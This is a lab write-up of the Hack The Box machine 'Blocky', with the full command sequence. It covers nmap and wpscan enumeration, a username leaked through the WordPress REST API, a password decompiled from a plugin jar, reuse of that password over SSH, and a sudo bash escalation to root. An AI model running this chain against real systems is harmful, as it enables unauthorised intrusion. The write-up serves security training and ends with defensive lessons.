# HTB Write-up: Blocky

**Difficulty:** Easy
**OS:** Linux
**Target IP:** 10.129.57.83
**Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning
Started with a fast port sweep using `rustscan`, followed by a detailed service scan with `nmap`.

```bash
rustscan -a 10.129.57.83
```

```
Open 10.129.57.83:21
Open 10.129.57.83:22
Open 10.129.57.83:80
Open 10.129.57.83:25565
```

```bash
nmap -sCV -T4 -p21,22,80,25565 10.129.57.83 -oA nmap/nmap
```

```
PORT      STATE SERVICE   VERSION
21/tcp    open  ftp?
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http      Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Key takeaways:
- Standard FTP/SSH/HTTP trio, plus an open **Minecraft server** on 25565 — an unusual and very specific theming clue for the rest of the box.
- HTTP redirects to a named vhost (`blocky.htb`), added to `/etc/hosts`.

---

## 2. Web Enumeration

### 2.1 Fingerprinting

```bash
whatweb http://blocky.htb
```

```
http://blocky.htb [200 OK] Apache[2.4.18], ... MetaGenerator[WordPress 4.8],
PoweredBy[WordPress,WordPress,], Title[BlockyCraft – Under Construction!], WordPress[4.8]
```

Confirmed **WordPress 4.8** (released 2017, well out of date) powering a "BlockyCraft" themed site — tying the web app directly to the Minecraft server found in the port scan.

### 2.2 WPScan

```bash
wpscan --url http://blocky.htb --disable-tls-checks --no-update
```

Notable findings:
- XML-RPC enabled (`xmlrpc.php`)
- Upload directory listing enabled at `/wp-content/uploads/`
- WordPress 4.8 confirmed via the RSS generator tag — flagged by WPScan as insecure
- Theme: **Twenty Seventeen**, also outdated
- No plugins or config backups discovered via passive/aggressive scanning

None of this directly yielded a working exploit, but it confirmed an aging WordPress install worth probing further via its REST API.

### 2.3 User Enumeration via WP REST API

```bash
curl http://blocky.htb/index.php/wp-json/wp/v2/users
```

```json
[{"id":1,"name":"Notch","...","slug":"notch", ...}]
```

The WordPress REST API leaked a valid, unauthenticated username: **`notch`** — fitting the Minecraft theme (a nod to Minecraft's creator).

### 2.4 Directory Bursting

```bash
ffuf -u http://blocky.htb/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
  -e .php,.html,.cgi,.txt -mc 200,301,302,303,403 -fs 52227
```

Notable results, beyond the standard WordPress structure:

```
wiki                    [Status: 301]
plugins                 [Status: 301]
phpmyadmin              [Status: 301]
```

`/plugins` stood out as non-standard for a default WordPress install and was investigated directly.

---

## 3. Exploitation — Foothold

### 3.1 Locating Minecraft Plugin Artifacts

Browsing `/plugins/` on the web server exposed two downloadable `.jar` files — Minecraft server plugins, tying back to the Minecraft service on 25565:

```bash
wget http://blocky.htb/plugins/files/BlockyCore.jar
wget http://blocky.htb/plugins/files/griefprevention-1.11.2-3.1.1.298.jar
```

`BlockyCore.jar` was a small, custom plugin (883 bytes) — clearly purpose-built for this box rather than a well-known third-party plugin like GriefPrevention.

### 3.2 Decompiling for Hardcoded Credentials

Opened `BlockyCore.jar` in **jd-gui** to decompile the bytecode back to readable Java source:

```java
package com.myfirstplugin;

public class BlockyCore {
  public String sqlHost = "localhost";
  public String sqlUser = "root";
  public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";

  public void onServerStart() {}
  public void onServerStop() {}

  public void onPlayerJoin() {
    sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
  }

  public void sendMessage(String username, String message) {}
}
```

The plugin's source hardcodes MySQL **root** credentials directly in the class file: `root:8YsqfCTnvxAUeduzjNSXe22`. Classic developer mistake — compiled Java bytecode decompiles trivially, so embedding secrets in it offers no real protection.

### 3.3 Credential Reuse → SSH Access

Password reuse is common on these boxes, so the recovered password was tried directly against the previously enumerated user over SSH rather than the MySQL service:

```bash
ssh notch@10.129.57.83
```

```
notch@10.129.57.83's password:
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
...
notch@Blocky:~$ whoami
notch
```

✅ Foothold obtained directly as `notch` — the leaked MySQL password had been reused as the user's own login password. `user.txt` was retrieved from `notch`'s home directory.

---

## 4. Privilege Escalation

### 4.1 Checking Sudo Rights

```bash
sudo -l
```

```
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

`notch` is configured with **unrestricted sudo access** (`ALL : ALL) ALL`) — no privilege escalation technique needed beyond simply invoking sudo.

### 4.2 Escalating to Root

```bash
sudo /bin/bash -p
```

```
root@Blocky:~/minecraft# whoami
root
root@Blocky:/root# ls
root.txt
```

✅ Root access obtained.

---

## 5. Summary

| Stage | Technique |
|-------|-----------|
| Recon | `rustscan` + `nmap` → FTP, SSH, HTTP, and an exposed Minecraft server on 25565 |
| Web fingerprinting | `whatweb` + `wpscan` → outdated WordPress 4.8 site themed around the Minecraft server |
| User enumeration | WP REST API (`/wp-json/wp/v2/users`) leaked the username `notch` unauthenticated |
| Sensitive file discovery | `ffuf` found `/plugins`, exposing a custom Minecraft plugin `.jar` |
| Credential disclosure | Decompiled `BlockyCore.jar` with jd-gui, recovering hardcoded MySQL root credentials in plaintext source |
| Foothold | Reused MySQL password directly against SSH for user `notch` — worked immediately |
| Privilege Escalation | `sudo -l` showed unrestricted `(ALL : ALL) ALL` — `sudo /bin/bash -p` → root |

**Root cause / lessons learned:**
- Never hardcode credentials — even in compiled artifacts like `.jar`/`.class` files. Java bytecode decompiles almost losslessly back to source, so this offers effectively zero protection.
- The WordPress REST API's user endpoint (`/wp-json/wp/v2/users`) is enabled and unauthenticated by default in older WordPress versions — this should be restricted or the endpoint disabled if usernames are sensitive.
- Password reuse across services (database credentials reused as an OS login password) turned a single leaked secret into full SSH access.
- Granting a low-privileged user unrestricted `sudo ALL` defeats the purpose of having a separate account at all — `sudoers` entries should be scoped to the specific binaries/commands actually required.

---

## 6. Tools Used

- `rustscan`, `nmap` — reconnaissance
- `whatweb`, `wpscan` — web/CMS fingerprinting
- `curl` — WordPress REST API enumeration
- `ffuf` — content discovery
- `wget` — artifact retrieval
- `jd-gui` — Java decompilation
- `ssh` — credential validation and foothold
- `sudo` — privilege escalation
